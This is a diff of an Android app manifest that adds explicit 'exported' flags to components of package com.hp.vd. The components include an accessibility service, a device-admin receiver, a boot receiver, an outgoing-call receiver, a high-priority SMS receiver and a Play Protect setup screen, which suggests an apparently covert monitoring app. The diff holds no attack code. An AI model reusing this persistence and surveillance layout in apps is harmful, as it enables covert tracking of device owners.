@@ -45,14 +45,14 @@
         <activity android:excludeFromRecents="true" android:label="@string/config_launcher_name" android:name="com.hp.vd.CompletedActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.Holo.Light"/>
         <activity android:excludeFromRecents="true" android:label="@string/config_launcher_name" android:name="com.hp.vd.NetworkUnavailableActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.Holo.Light"/>
         <activity android:excludeFromRecents="true" android:label="@string/config_launcher_name" android:name="com.hp.vd.PresetupPlayProtectActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.Holo.Light"/>
-        <activity android:excludeFromRecents="true" android:label="@string/config_launcher_name" android:name="com.hp.vd.RegisterActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.Holo.Light">
+        <activity android:excludeFromRecents="true" android:exported="true" android:label="@string/config_launcher_name" android:name="com.hp.vd.RegisterActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.Holo.Light">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity>
         <service android:enabled="true" android:exported="false" android:name="com.hp.vd.ServiceMain"/>
-        <service android:label="@string/label_accessibility_service_appname" android:name="com.hp.vd.MainAccesssibilityService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+        <service android:exported="true" android:label="@string/label_accessibility_service_appname" android:name="com.hp.vd.MainAccesssibilityService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService"/>
             </intent-filter>
@@ -63,12 +63,12 @@
                 <action android:name="com.google.firebase.INSTANCE_ID_EVENT"/>
             </intent-filter>
         </service>
-        <service android:name="com.hp.vd.fcm.FcmMessagingService">
+        <service android:exported="false" android:name="com.hp.vd.fcm.FcmMessagingService">
             <intent-filter>
                 <action android:name="com.google.firebase.MESSAGING_EVENT"/>
             </intent-filter>
         </service>
-        <receiver android:description="@string/description_x" android:label="@string/label_x" android:name="com.hp.vd.agent.DeviceAdminHandler" android:permission="android.permission.BIND_DEVICE_ADMIN">
+        <receiver android:description="@string/description_x" android:exported="true" android:label="@string/label_x" android:name="com.hp.vd.agent.DeviceAdminHandler" android:permission="android.permission.BIND_DEVICE_ADMIN">
             <meta-data android:name="android.app.device_admin" android:resource="@xml/my_admin"/>
             <intent-filter>
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
@@ -76,7 +76,7 @@
                 <action android:name="android.app.action.ACTION_DEVICE_ADMIN_DISABLED"/>
             </intent-filter>
         </receiver>
-        <receiver android:name="com.hp.vd.starter.OnBootBroadcastReceiver">
+        <receiver android:exported="true" android:name="com.hp.vd.starter.OnBootBroadcastReceiver">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
                 <category android:name="android.intent.category.HOME"/>
@@ -87,12 +87,12 @@
                 <action android:name="com.hp.va.FALLBACK_START"/>
             </intent-filter>
         </receiver>
-        <receiver android:name="com.hp.vd.DialActivatorBroadcastReceiver">
+        <receiver android:exported="true" android:name="com.hp.vd.DialActivatorBroadcastReceiver">
             <intent-filter>
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
             </intent-filter>
         </receiver>
-        <receiver android:enabled="true" android:name="com.hp.vd.starter.SmsStartupBroadcastReceiver">
+        <receiver android:enabled="true" android:exported="true" android:name="com.hp.vd.starter.SmsStartupBroadcastReceiver">
             <intent-filter android:priority="1000">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
             </intent-filter>
